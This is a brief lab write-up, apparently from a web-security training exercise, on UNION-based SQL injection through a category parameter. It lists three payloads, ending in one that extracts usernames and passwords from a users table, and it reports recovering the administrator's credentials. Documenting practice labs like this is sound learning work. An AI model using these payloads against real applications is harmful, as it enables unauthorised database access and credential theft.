# Lab Name
SQL injection UNION attack, retrieving data from other tables

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to retrieving data from other tables

## Entry Point
Category parameter

## Payload Used

' UNION SELECT NULL, NULL--

<img width="1496" height="770" alt="2 1" src="https://github.com/user-attachments/assets/3be499cd-6ce9-44f2-ae28-963cfaa2cbca" />


' UNION SELECT 'test', 'test'--

<img width="1497" height="746" alt="2 2" src="https://github.com/user-attachments/assets/96c53ecb-207c-4b6e-92ae-16893935748d" />


' UNION SELECT username, password FROM users--

<img width="1496" height="800" alt="2 3" src="https://github.com/user-attachments/assets/0f9c8f98-a4a5-4af5-a4d2-05b169b0fe93" />


## Result
Successfully Identified administrator username and password from other table.

<img width="1853" height="918" alt="image" src="https://github.com/user-attachments/assets/4b2a88e6-bcf2-4b59-ad9b-e4dc444ebf8e" />

## Learning
UNION SELECT NULL, NULL is used to determine the exact number of columns.

UNION SELECT 'test', 'test' is used to check which column conten text


Final UNION query extract data.
